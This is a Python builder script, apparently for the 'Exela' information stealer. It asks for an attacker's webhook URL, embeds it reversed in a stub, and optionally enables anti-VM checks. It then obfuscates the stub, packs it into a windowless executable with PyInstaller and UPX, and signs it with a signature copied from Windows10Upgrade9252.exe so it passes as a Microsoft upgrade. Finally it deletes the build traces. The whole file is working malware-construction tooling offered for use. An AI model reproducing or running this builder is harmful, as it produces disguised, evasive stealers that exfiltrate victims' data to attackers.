import os, shutil, time, sys

class Build:
    def __init__(self) -> None:
        self.pyinstallerCommand = "pyinstaller --onefile --noconsole --clean --upx-dir upx-4.0.2-win64 "
        self.useIcon = False
        self.antivmorospusu = "true"
        self.compileToExe()
    def compileToExe(self):
        try:
            self.moduleInstaller()
            os.system("cls")
            getWebhook = str(input('Enter Your webhook URL : '))
            time.sleep(0.5)
            getAntiVmReq = str(input('Yes/no\nDo you want to use Anti-VM : '))
            if getAntiVmReq.lower() == "n" or getAntiVmReq.lower() == "no":
                self.antivmorospusu = "false"
            else:
                self.antivmorospusu = "true"
            getIcon = str(input("Yes/no\nDo you want to change the icon of the file : "))
            iconPath = None
            if getIcon.lower() == "yes" or getIcon.lower() == "y":
                self.useIcon = True
                getIconPath = input(str("icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "))
                if not getIconPath.endswith(".ico"):
                    print("invalid icon\nIcon change has been disabled.")
                    self.useIcon = False
                else:
                    iconPath == getIconPath
            if self.useIcon == True:
                self.pyinstallerCommand += f"--icon={getIconPath} quicaxd.py"
            else:self.pyinstallerCommand += "quicaxd.py"
            with open("Exela.py", "r", encoding="utf-8", errors="ignore") as f:
                readedCode = f.read()
            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1]).replace('%AnTiVm%', self.antivmorospusu)
            
            with open("stub.py", "w", encoding="utf-8", errors="ignore") as x:
                x.write(replacedCode)
            self.obfuscateFile()
            time.sleep(1)
            os.system(self.pyinstallerCommand)
        except:
            os.system('cls')
            print("An error occurred while compiling your file\nplease contact the coder or check your python version")
            time.sleep(1)
            sys.exit(0)
        else:
            os.system('cls')
            print("Your File compiled was succesfully")
            time.sleep(1)
            self.singFile("Windows10Upgrade9252.exe", os.getcwd() + "\\dist\\quicaxd.exe", "quicaxd.exe")
     
    def obfuscateFile(self):
        os.system("cls")
        print("Obfuscating file pls wait")
        time.sleep(1)
        command = "python obfuscation.py -o quicaxd.py stub.py"
        os.system(command)
            
    def moduleInstaller(self):
        try:
            os.system('cls')
            os.system("pip install psutil")
            os.system("pip install wmi")
            os.system("pip install mss")
            os.system("pip install pycryptodome")
            os.system("pip install pypiwin32")
            os.system("pip install dhooks")
            os.system("pip install requests")
            os.system("pip install uuid")
            os.system("pip install pyinstaller")
        except:
            os.system('cls')
            print("An error occurred while downloading modules, make sure your python version is higher than 3.5")
            sys.exit(0)
        else:
            os.system('cls')
            print("Modules successfully downloaded")
            time.sleep(1)
            
    def singFile(self, signedFile, inputFile, outputFile):
        try:
            os.system("cls")
            print("Signing your file pls wait")
            time.sleep(1.5)
            runCommand = f"python digital-sign.py -i {signedFile} -t {inputFile} -o {outputFile}"
            os.system(runCommand)
            time.sleep(1.5)
        except:
            os.system("cls")
            print("An error occurred while signing your file with a digital signature, please use the stub.exe file in the dist/stub.exe folder")
            self.clearJunkFiles()
        else:
            os.system('cls')
            print(f"Your File signed Succesffuly, your file is => {outputFile}")
            self.clearJunkFiles()
    def clearJunkFiles(self):
        try:
            os.remove('quicaxd.py')
            os.remove('quicaxd.spec')
            os.remove('stub.py')
            shutil.rmtree('build')
            shutil.rmtree('dist')
        except Exception as e:
            sys.exit(0)
        else:
            sys.exit(0)

if __name__ == '__main__':
    Build()
